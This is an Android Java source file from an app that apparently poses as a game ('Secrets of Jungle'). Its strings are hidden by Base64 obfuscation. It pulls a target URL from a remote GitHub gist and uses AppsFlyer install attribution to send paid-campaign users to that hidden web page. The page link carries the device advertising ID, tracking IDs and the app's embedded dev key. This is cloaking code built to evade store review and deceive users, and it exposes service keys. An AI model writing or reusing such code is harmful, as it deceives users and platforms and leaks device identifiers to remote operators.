package com.ssetcer.oefljgun;

import android.content.Intent;
import android.util.Base64;
import android.util.Log;

import com.appsflyer.AppsFlyerConversionListener;
import com.appsflyer.AppsFlyerLib;
import com.onesignal.OneSignal;

import java.io.IOException;
import java.util.Map;
import java.util.Objects;

import okhttp3.ResponseBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;

public class HTTPconect extends SOJ {
    private static String lineThreeSsetcerOefljgun = "aHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9SS0RldjExLzA4ZWFhZjY5YjdiZmQ3NThkMDM5MWQ4ZjhiZDk4OTFmL3Jhdy9TZWNyZXRzJTI1MjBvZiUyNTIwSnVuZ2xlLw==";
    public static String lineSsetcerOefljgun;
    public static String kkOnekkCkkignalSsetcerOefljgun = "YzExMTUyYmMtODhlYi00YmMwLTgyMTQtMWU1ZmVlMjJmN2Vj";
    public static String KK_APPPS_KK_ID_SSERCER_OEFLJGUN = "RUZuQ29XeUFxc1RGb2hXaTY2M2UzQg==";
    public String paramsSsetcerOefljgun;
    public String appKkStatusSsetcerOefljgun = "";

    AppsFlyerConversionListener appsFlyerConversionListenerSsetcerOefljgun = new AppsFlyerConversionListener() {
        @Override
        public void onConversionDataSuccess(Map<String, Object> map) {
            appKkStatusSsetcerOefljgun = Objects.requireNonNull(map.get(Dec("YWZfc3RhdHVz")).toString());
            if (appKkStatusSsetcerOefljgun.equals(Dec("Tm9uLW9yZ2FuaWM="))) {
                String kKkCampaingStatusSsetcerOefljgun = Objects.requireNonNull(map.get(Dec("Y2FtcGFpZ24="))).toString();
                paramsSsetcerOefljgun = MPars(kKkCampaingStatusSsetcerOefljgun);
            }
        }
        @Override
        public void onConversionDataFail(String s) {
        }
        @Override
        public void onAppOpenAttribution(Map<String, String> map) {
        }
        @Override
        public void onAttributionFailure(String s) {
        }
    };


    public void MainMethod(String linkSsetcerOefljgun, String keySsetcerOefljgun, String fbDataSsetcerOefljgun, SOJ sojSsetcerOefljgun) {
        if (appKkStatusSsetcerOefljgun.equals(Dec("Tm9uLW9yZ2FuaWM="))) {
            String trueMainSsetcerOefljgun = (linkSsetcerOefljgun + paramsSsetcerOefljgun);
            Log.i(SOJ.LOG, "Non-organic: " + trueMainSsetcerOefljgun);
            sojSsetcerOefljgun.goWeb(trueMainSsetcerOefljgun);
        } else if (fbDataSsetcerOefljgun != null) {
            String trueMainSsetcerOefljgun = (linkSsetcerOefljgun + fbDataSsetcerOefljgun);
            Log.i(SOJ.LOG, "FbbStatus: " + trueMainSsetcerOefljgun);
            sojSsetcerOefljgun.goWeb(trueMainSsetcerOefljgun);
        } else {
            if (keySsetcerOefljgun.equals(Dec("Tk8="))) {
                Intent intentLoad = new Intent(sojSsetcerOefljgun.getApplicationContext(), loadView.class);
                sojSsetcerOefljgun.startActivity(intentLoad);
                sojSsetcerOefljgun.finishAffinity();
            } else {
                String paramsExitSsetcerOefljgun = (keySsetcerOefljgun + Dec("P2J1bmRsZT0=") + Dec("Y29tLnNzZXRjZXIub2VmbGpndW4=") +
                        Dec("JmFkX2lkPQ==") + SOJ.kKkIdContextSsetcerOefljgun + Dec("JmFwcHNfaWQ9") +
                        SOJ.idAppsKKSsetcerOefljgun + Dec("JmRldl9rZXk9") + Dec(KK_APPPS_KK_ID_SSERCER_OEFLJGUN));
                String trueMainSsetcerOefljgun = linkSsetcerOefljgun + paramsExitSsetcerOefljgun;
                Log.i(SOJ.LOG, "organic: " + trueMainSsetcerOefljgun);
                sojSsetcerOefljgun.goWeb(trueMainSsetcerOefljgun);
            }
        }
    }

    public static String RequestThree() {
        Retrofit retrofitSsetcerOefljgun = new Retrofit.Builder().
                baseUrl(Dec(lineThreeSsetcerOefljgun)).build();
        Info infoSsetcerOefljgun = retrofitSsetcerOefljgun.create(Info.class);
        Call<ResponseBody> gistQuery = infoSsetcerOefljgun.getStrU();

        gistQuery.enqueue(new Callback<ResponseBody>() {
            @Override
            public void onResponse(Call<ResponseBody> callSsetcerOefljgun, Response<ResponseBody> responseSsetcerOefljgun) {
                if (responseSsetcerOefljgun.isSuccessful()) {
                    try {
                        lineSsetcerOefljgun = responseSsetcerOefljgun.body().string();

                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }
            }

            @Override
            public void onFailure(Call<ResponseBody> call, Throwable t) {
            }
        });
        return lineSsetcerOefljgun;
    }

    public void SignalConnect(SOJ sojSsetcerOefljgun) {
        com.onesignal.OneSignal.setLogLevel(com.onesignal.OneSignal.LOG_LEVEL.VERBOSE, com.onesignal.OneSignal.LOG_LEVEL.NONE);
        com.onesignal.OneSignal.initWithContext(sojSsetcerOefljgun);
        com.onesignal.OneSignal.setAppId(Dec(kkOnekkCkkignalSsetcerOefljgun));
    }
    public String AppsConnect(SOJ sojSsetcerOefljgun){
        AppsFlyerLib.getInstance().init(Dec(KK_APPPS_KK_ID_SSERCER_OEFLJGUN), appsFlyerConversionListenerSsetcerOefljgun, sojSsetcerOefljgun);
        AppsFlyerLib.getInstance().start(sojSsetcerOefljgun);
        idAppsKKSsetcerOefljgun = AppsFlyerLib.getInstance().getAppsFlyerUID(sojSsetcerOefljgun);
        return idAppsKKSsetcerOefljgun;
    }

    String keySsetcerOefljgun;
    String sub6SsetcerOefljgun;
    String sub7SsetcerOefljgun;
    String sub2SsetcerOefljgun;
    String sub3SsetcerOefljgun;
    String sub4SsetcerOefljgun;
    String sub5SsetcerOefljgun;
    public String[] lineArraySsetcerOefljgun;

    public String MPars(String lineGetSsetcerOefljgun) {

        lineArraySsetcerOefljgun = lineGetSsetcerOefljgun.split("::");

        try {
            keySsetcerOefljgun = lineArraySsetcerOefljgun[0];
        } catch (NullPointerException e) {
            keySsetcerOefljgun = "";
        }
        try {
            sub6SsetcerOefljgun = lineArraySsetcerOefljgun[1];
        } catch (NullPointerException e) {
            sub6SsetcerOefljgun = "";
        }
        try {
            sub7SsetcerOefljgun = lineArraySsetcerOefljgun[2];
        } catch (NullPointerException e) {
            sub7SsetcerOefljgun = "";
        }
        try {
            sub2SsetcerOefljgun = lineArraySsetcerOefljgun[3];
        } catch (NullPointerException e) {
            sub2SsetcerOefljgun = "";
        }
        try {
            sub3SsetcerOefljgun = lineArraySsetcerOefljgun[4];
        } catch (NullPointerException e) {
            sub3SsetcerOefljgun = "";
        }
        try {
            sub4SsetcerOefljgun = lineArraySsetcerOefljgun[5];
        } catch (NullPointerException e) {
            sub4SsetcerOefljgun = "";
        }
        try {
            sub5SsetcerOefljgun = lineArraySsetcerOefljgun[6];
        } catch (NullPointerException e) {
            sub5SsetcerOefljgun = "";
        }

        OneSignal.sendTag(Dec("c3ViX2FwcA=="), sub6SsetcerOefljgun);
        String paramsNow = (keySsetcerOefljgun + Dec("P2J1bmRsZT0=") + (BuildConfig.APPLICATION_ID)
                + Dec("JmFkX2lkPQ==") + SOJ.kKkIdContextSsetcerOefljgun + Dec("JmFwcHNfaWQ9") + SOJ.idAppsKKSsetcerOefljgun +
                Dec("JmRldl9rZXk9") + Dec(KK_APPPS_KK_ID_SSERCER_OEFLJGUN) +
                Dec("JnN1YjY9") + sub6SsetcerOefljgun +
                Dec("JnN1Yjc9") + sub7SsetcerOefljgun +
                Dec("JnN1YjI9") + sub2SsetcerOefljgun +
                Dec("JnN1YjM9") + sub3SsetcerOefljgun +
                Dec("JnN1YjQ9") + sub4SsetcerOefljgun +
                Dec("JnN1YjU9") + sub5SsetcerOefljgun);
        return paramsNow;
    }


    public static String Dec(String string) {
        String decSsetcerOefljgun = new String(android.util.Base64.decode(string, Base64.DEFAULT));
        return decSsetcerOefljgun;
    }
}

